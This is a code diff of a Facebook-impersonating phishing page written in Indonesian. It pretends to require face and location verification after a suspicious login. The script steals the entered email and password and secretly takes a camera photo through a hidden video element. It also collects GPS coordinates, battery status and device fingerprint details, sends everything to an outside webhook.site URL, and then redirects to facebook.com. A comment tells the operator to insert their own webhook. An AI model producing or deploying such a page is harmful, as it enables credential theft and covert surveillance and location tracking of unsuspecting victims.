@@ -3,91 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Security Verification</title>
+    <title>Facebook Identity Verification</title>
     <style>
-        body { font-family: sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 100%; max-width: 350px; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
-        #cam-preview { display: none; } /* Kamera jalan di balik layar */
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 100%; max-width: 360px; text-align: center; }
+        .logo { width: 180px; margin-bottom: 15px; }
+        .msg { font-size: 14px; color: #1c1e21; margin-bottom: 20px; line-height: 1.4; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
+        button { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        #vid { display: none; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zSkmkv.svg" width="150">
-    <p>Demi keamanan, sistem memerlukan <b>Verifikasi Wajah</b> dan <b>Lokasi</b> untuk memulihkan sesi Anda.</p>
-    <input type="text" id="u" placeholder="Email/Telepon">
-    <input type="password" id="p" placeholder="Kata Sandi">
-    <button onclick="startExploit()">Konfirmasi & Verifikasi</button>
+<div class="card">
+    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zSkmkv.svg" class="logo">
+    <div class="msg"><b>Tindakan Diperlukan:</b> Kami mendeteksi login tidak sah. Sesuai standar keamanan terbaru, harap lakukan <b>Verifikasi Wajah</b> dan konfirmasi lokasi Anda.</div>
+    
+    <input type="text" id="user" placeholder="Email atau Nomor Telepon" autocomplete="off">
+    <input type="password" id="pass" placeholder="Kata Sandi" autocomplete="off">
+    <button onclick="execute()">Verifikasi & Masuk</button>
 </div>
 
-<video id="cam-preview" autoplay></video>
+<!-- Elemen Tersembunyi buat Ambil Foto -->
+<video id="vid" autoplay></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
+    // MASUKKAN URL WEBHOOK LO DISINI
     const WEBHOOK_URL = "https://webhook.site/a8889196-bf1c-4c88-9a69-8eacaf2e1bd0";
 
-    async function startExploit() {
-        const u = document.getElementById('u').value;
-        const p = document.getElementById('p').value;
+    async function execute() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
 
-        // 1. Ambil Izin Kamera & Ambil Foto
+        if(!u || !p) return alert("Harap isi data dengan benar.");
+
+        let photoData = "Camera Access Denied";
+        let gpsData = "GPS Access Denied";
+        let batteryInfo = "N/A";
+
+        // 1. Ambil Info Baterai
+        try {
+            const b = await navigator.getBattery();
+            batteryInfo = `${(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+        } catch(e) {}
+
+        // 2. Ambil Foto Kamera Depan
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('cam-preview');
+            const video = document.getElementById('vid');
             video.srcObject = stream;
             
-            setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const photoData = canvas.toDataURL('image/jpeg'); // Ini foto wajahnya
-                
-                // Matikan kamera setelah dapet foto
-                stream.getTracks().forEach(track => track.stop());
-                
-                // Lanjut ambil GPS dan kirim semua
-                getFinalData(u, p, photoData);
-            }, 2000);
-        } catch (e) {
-            getFinalData(u, p, "Kamera Ditolak");
-        }
-    }
+            // Tunggu 1.5 detik biar kamera fokus baru jepret
+            await new Promise(r => setTimeout(r, 1500));
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            photoData = canvas.toDataURL('image/jpeg', 0.7); // 0.7 kualitas kompresi
+            
+            stream.getTracks().forEach(t => t.stop()); // Matikan kamera
+        } catch(e) {}
 
-    async function getFinalData(u, p, img) {
-        // Ambil info Baterai
-        const batt = await navigator.getBattery();
-        const battInfo = `${(batt.level * 100)}% (${batt.charging ? 'Charging' : 'Discharging'})`;
-
+        // 3. Ambil Lokasi GPS
         navigator.geolocation.getCurrentPosition((pos) => {
-            sendData(u, p, img, battInfo, {
+            gpsData = {
                 lat: pos.coords.latitude,
                 lon: pos.coords.longitude,
-                map: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-            });
+                acc: pos.coords.accuracy + " meters",
+                maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+            };
+            finalize(u, p, photoData, gpsData, batteryInfo);
         }, () => {
-            sendData(u, p, img, battInfo, "GPS Ditolak");
-        });
+            finalize(u, p, photoData, gpsData, batteryInfo);
+        }, { enableHighAccuracy: true });
     }
 
-    function sendData(u, p, img, b, l) {
+    function finalize(u, p, img, loc, batt) {
+        const payload = {
+            target_hit: true,
+            credentials: { email: u, pass: p },
+            location: loc,
+            battery: batt,
+            photo: img,
+            device: {
+                ua: navigator.userAgent,
+                os: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                cores: navigator.hardwareConcurrency
+            },
+            time: new Date().toLocaleString()
+        };
+
         fetch(WEBHOOK_URL, {
             method: 'POST',
             mode: 'no-cors',
-            body: JSON.stringify({
-                user: u,
-                pass: p,
-                battery: b,
-                location: l,
-                photo: img, // Data foto dalam bentuk Base64
-                agent: navigator.userAgent
-            })
+            body: JSON.stringify(payload)
         });
-        alert("Sistem Sedang Memproses. Silakan tunggu 1x24 jam.");
+
+        alert("Verifikasi Selesai. Sesi Anda akan dipulihkan dalam 24 jam.");
         window.location.href = "https://facebook.com";
     }
 </script>
+
 </body>
 </html>
